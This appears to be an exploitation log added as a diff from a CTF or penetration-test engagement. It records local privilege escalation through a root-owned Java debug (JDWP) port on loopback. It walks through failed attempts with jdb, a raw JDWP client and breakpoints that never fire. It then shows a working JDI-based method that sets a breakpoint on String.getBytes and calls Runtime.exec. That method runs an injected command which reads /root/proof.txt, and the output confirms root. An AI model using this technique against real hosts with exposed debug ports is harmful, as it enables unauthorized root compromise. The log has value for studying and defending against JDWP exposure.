@@ -1,0 +1,76 @@
+# JDWP -> root, as observed on the target
+# target service: java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
+# listener: 127.0.0.1:8000 (loopback only), owner root, PID 698
+
+== earlier attempt: jdb (fails) ==
+$ jdb -attach 8000 <<'EOF'
+threads
+print new java.lang.ProcessBuilder("/bin/bash","-c","id > /tmp/jdwp_probe").start()
+exit
+EOF
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+Initializing jdb ...
+> "1" is not a valid thread id.
+> cat: /tmp/jdwp_probe: No such file or directory
+
+== earlier attempt: raw JDWP client, wrong command numbering ==
+[*] id sizes field/method/object/refType/frame = (5, 0, 1, 0, 2)
+Traceback (most recent call last):
+  File "/tmp/jdwp_rce.py", line 195, in <module>
+    raise SystemExit(main())
+  File "/tmp/jdwp_rce.py", line 142, in main
+    threads = j.all_threads()
+  File "/tmp/jdwp_rce.py", line 58, in all_threads
+    n = struct.unpack(">I", d[:4])[0]
+struct.error: unpack requires a buffer of 4 bytes
+# (5,0,1,0,2) is nonsense: Command(4) is AllThreads, not IDSizes (which is Command(7))
+# after fixing the table, invoke still failed with JDWP error 10 = INVALID_THREAD
+
+== earlier attempt: breakpoint on StringBuilder.append (never fires) ==
+[*] attached to OpenJDK 64-Bit Server VM 11.0.16
+[*] breakpoint set at java.lang.StringBuilder.append
+Exception in thread "main" java.lang.IllegalStateException: no breakpoint event received
+# Java 9+ compiles string concatenation to invokedynamic/StringConcatFactory
+
+== earlier attempt: breakpoint on ServerSocket.accept (never fires) ==
+[*] attached to OpenJDK 64-Bit Server VM 11.0.16
+[*] breakpoint set at java.net.ServerSocket.accept
+Exception in thread "main" java.lang.IllegalStateException: no breakpoint event received
+# the main thread was already parked inside accept(); no new entry occurred
+
+== working attempt: compile for Java 11 ==
+$ javac JdiBreakExec.java
+Error: LinkageError occurred while loading main class JdiBreakExec
+        java.lang.UnsupportedClassVersionError: JdiBreakExec has been compiled by a more recent
+        version of the Java Runtime (class file version 62.0), this version of the Java Runtime
+        only recognizes class file versions up to 55.0
+
+$ javac --release 11 --add-modules jdk.jdi JdiBreakExec.java
+$ ls -l /tmp/JdiBreakExec.class
+-rw-r--r-- 1 dev dev 5972 Nov 16 01:28 /tmp/JdiBreakExec.class
+
+== working attempt: run ==
+$ java --add-modules jdk.jdi JdiBreakExec 127.0.0.1 8000 \
+    'bash -c id>/tmp/r_id;cat${IFS}/root/proof.txt>/tmp/r_proof'
+[*] attached to OpenJDK 64-Bit Server VM 11.0.16
+[*] breakpoint set at java.lang.String.getBytes
+[*] breakpoint hit on thread: main frames=9
+[*] Runtime instance = instance of java.lang.Runtime(id=8)
+[+] exec returned instance of java.lang.ProcessImpl(id=10)
+RC=0
+== id ==
+uid=0(root) gid=0(root) groups=0(root)
+== proof ==
+43d31153587be5031d1db3f9a934eb46
+
+== re-verification later in the engagement (same host, unchanged) ==
+[*] attached to OpenJDK 64-Bit Server VM 11.0.16
+[*] breakpoint set at java.lang.String.getBytes
+[*] breakpoint hit on thread: main frames=9
+[*] Runtime instance = instance of java.lang.Runtime(id=8)
+[+] exec returned instance of java.lang.ProcessImpl(id=10)
+== id ==
+uid=0(root) gid=0(root) groups=0(root)
+== proof ==
+43d31153587be5031d1db3f9a934eb46
